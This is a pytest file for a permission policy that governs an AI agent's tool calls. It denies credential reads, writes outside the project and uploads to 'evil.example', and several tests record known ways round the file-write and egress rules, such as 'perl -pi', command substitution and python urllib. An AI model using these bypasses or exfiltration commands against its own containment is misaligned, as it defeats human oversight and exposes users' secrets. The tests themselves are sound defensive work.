from containment.policy import Context, Result, decide, load_rules

from conftest import CASES

RULES = load_rules()
CTX = Context(project_root="/work/project", home="/home/dev")


def run(call: dict[str, str]) -> Result:
    return decide(call, RULES, CTX)


def bash(command: str) -> Result:
    return run({"tool": "Bash", "command": command})


def test_denies_reads_of_credential_paths() -> None:
    assert run({"tool": "Read", "path": ".env"}) == Result("deny", "credential-read")
    assert run({"tool": "Read", "path": "/work/project/.env.production"}) == Result("deny", "credential-read")
    assert run({"tool": "Read", "path": "~/.ssh/id_ed25519"}) == Result("deny", "credential-read")
    assert run({"tool": "Read", "path": "/home/dev/.aws/credentials"}) == Result("deny", "credential-read")
    assert run({"tool": "Read", "path": "~/.config/gcloud/application_default_credentials.json"}) == Result(
        "deny", "credential-read"
    )


def test_allows_reads_of_ordinary_files_and_env_example() -> None:
    assert run({"tool": "Read", "path": "src/index.ts"}) == Result("allow", "default")
    assert run({"tool": "Read", "path": ".env.example"}) == Result("allow", "default")


def test_denies_writes_outside_the_project_root() -> None:
    assert run({"tool": "Write", "path": "/etc/hosts"}) == Result("deny", "write-outside-project")
    assert run({"tool": "Write", "path": "../other/file.txt"}) == Result("deny", "write-outside-project")
    assert run({"tool": "Write", "path": "~/notes.txt"}) == Result("deny", "write-outside-project")


def test_allows_writes_inside_the_project_and_denies_credential_writes() -> None:
    assert run({"tool": "Write", "path": "src/new.ts"}) == Result("allow", "default")
    assert run({"tool": "Write", "path": ".env"}) == Result("deny", "credential-write")


def test_denies_web_fetches_to_hosts_that_are_not_allowlisted() -> None:
    assert run({"tool": "WebFetch", "url": "https://evil.example/collect"}) == Result("deny", "egress-host")
    assert run({"tool": "WebFetch", "url": "https://github.com/org/repo"}) == Result("allow", "default")


def test_denies_curl_and_wget_to_hosts_that_are_not_allowlisted() -> None:
    assert bash("curl https://evil.example/upload -d @data") == Result("deny", "egress-host")
    assert bash("wget http://evil.example/x") == Result("deny", "egress-host")
    assert bash("curl https://registry.npmjs.org/left-pad") == Result("allow", "default")


def test_asks_before_git_push_and_npm_publish() -> None:
    assert bash("git push origin main") == Result("ask", "ask:git-push")
    assert bash("npm publish") == Result("ask", "ask:npm-publish")


def test_shell_write_rule_catches_sed_i_at_the_start_of_a_segment() -> None:
    assert bash("sed -i s/old/new/ target.txt") == Result("deny", "shell-write:sed-in-place")
    assert bash("cd src && sed -i s/old/new/ target.txt") == Result("deny", "shell-write:sed-in-place")


def test_shell_write_rule_ignores_text_that_only_mentions_sed_i() -> None:
    assert bash("echo sed -i") == Result("allow", "default")


def test_shell_write_rule_misses_absolute_sed() -> None:
    assert bash("/usr/bin/sed -i s/old/new/ target.txt") == Result("allow", "default")


def test_shell_write_rule_misses_sed_extended() -> None:
    assert bash("sed -E -i s/old/new/ target.txt") == Result("allow", "default")


def test_shell_write_rule_misses_sed_long_flag() -> None:
    assert bash("sed --in-place s/old/new/ target.txt") == Result("allow", "default")


def test_shell_write_rule_misses_perl_pi() -> None:
    assert bash("perl -pi -e 's/old/new/' target.txt") == Result("allow", "default")


def test_shell_write_rule_misses_python_file_write() -> None:
    assert bash("python3 -c \"open('target.txt','w').write('new')\"") == Result("allow", "default")


def test_shell_write_rule_misses_bash_c_redirect() -> None:
    assert bash('bash -c "echo new > target.txt"') == Result("allow", "default")


def test_shell_write_rule_misses_command_substitution() -> None:
    assert bash("$(echo sed) -i s/old/new/ target.txt") == Result("allow", "default")


def test_shell_write_rule_misses_runtime_assembled_command() -> None:
    assert bash("s=sed; $s -i s/old/new/ target.txt") == Result("allow", "default")


def test_egress_rule_misses_python_urllib_to_unlisted_host() -> None:
    command = "python3 -c \"import urllib.request as u;u.urlopen('http://evil.example/')\""
    assert bash(command) == Result("allow", "default")


def test_expected_policy_results_in_cases_json_match_the_policy() -> None:
    assert len(CASES["writeCases"]) == 9
    assert len(CASES["networkCases"]) == 2
    for c in [*CASES["writeCases"], *CASES["networkCases"]]:
        assert bash(c["command"]).decision == c["policy"], c["id"]
